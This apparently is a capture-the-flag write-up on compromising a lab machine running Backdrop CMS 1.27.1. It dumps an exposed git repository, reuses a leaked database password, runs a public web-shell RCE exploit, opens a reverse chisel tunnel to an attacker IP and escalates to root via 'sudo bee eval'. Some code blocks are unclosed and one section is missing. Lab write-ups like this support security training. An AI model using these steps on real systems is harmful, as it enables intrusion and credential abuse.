## Git-dumper
The site is PHP backdrop on Apache and it has a `.git` folder exposed
```bash
git-dumper http://10.10.11.58 .
```

The version of backdrop is
```bash
grep BACKDROP_VERSION core/includes/bootstrap.inc
```
```
define('BACKDROP_VERSION', '1.27.1');
```

We find the creds to the mysql db, this may be useful later
```bash
$database = 'mysql://root:B******************@127.0.0.1/backdrop';
```

Running gitleaks, didn't find anyting really interesting
```bash
gitleaks detect . -r gileaks.json
```

Just the domain from the commiter's email address
```bash
jq .[].Email gileaks.json
```
```
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
```

Based on that we find tiffany, and confirm that this is a valid user from the login page of the webapp
```bash
grep -ri dog.htb ./*
```
```
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Turns out the db password and tiffany  are valid creds to connect to the site
```bash
tiffany@dog.htb:B******************
```

## RCE in backdrop 1.27.1

Looking for exploits related to backdrop version '1.27.1' we find this

- [https://packetstorm.news/files/id/189764/](https://packetstorm.news/files/id/189764/)

And run it
```bash
php poc.php http://10.10.11.58
```
```
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```

The ui already tells us that there's no php module for zip with may be a problem
![nozip.png](nozip.png)

It confirms that when we try to upload the zip from the exploit, but also tells us how to fix it.
![tar.png](tar.png)

So it's easy we can just bundle the exploit in tar for instance
```bash
tar cvf shell.tar shell
```

And that works, we just gotta go to the php web-shell and we have RCE
![rce.png](rce.png)

And we can of course call ourselves back to get a decent shell

Build chisel with statically linked C libs and deploy it

```bash
./chisel server -p 4040 --socks5 --reverse

```bash
./chisel client 10.10.16.20:4040 R:1080:socks

Connect to the database
```bash

According to the hashcat examples pages those are drupal7 hashes.
```bash
hashcat --help|grep -i drupal
```
```
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
```

Couldn't really crack anything though, maybe because they're salted? Or maybe because it's just a really hard hash to crack. I'm not sure.
```bash
hashcat -m 7900 hash.txt ~/.local/share/seclists/rockyou.txt

## Privesc with bee backdrop cli

```bash
grep 'sh$' /etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

The whole database part was quite useless anyway since apparently, the same password works with johncusack
```bash
sshpass -p"B******************" ssh johncusack@dog.htb
```

johncusack can run bee, which is a non official cli tool for backdrop


- [https://backdropcms.org/project/bee](https://backdropcms.org/project/bee)
- [https://github.com/backdrop-contrib/bee](https://github.com/backdrop-contrib/bee)

```bash
sudo -l
```
```
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```bash
sudo bee cron
```
```
 âœ”  Cron ran successfully.
```

I don't really know what's going on with that, looks like its counting the columns of the shell or something? is this my own rlwrap shell thing?
```bash
2025/03/28 16:58:10 CMD: UID=0     PID=2986   | sh -c if tput cols &>/dev/null; then  echo $(tput cols); else $(echo $COLUMNS); fi
```

There's also an eval feature in bee, that makes stings easy, calling myself back again with a decent shell as root
```bash
sudo bee eval "system('bash /dev/shm/shell.sh');"
```
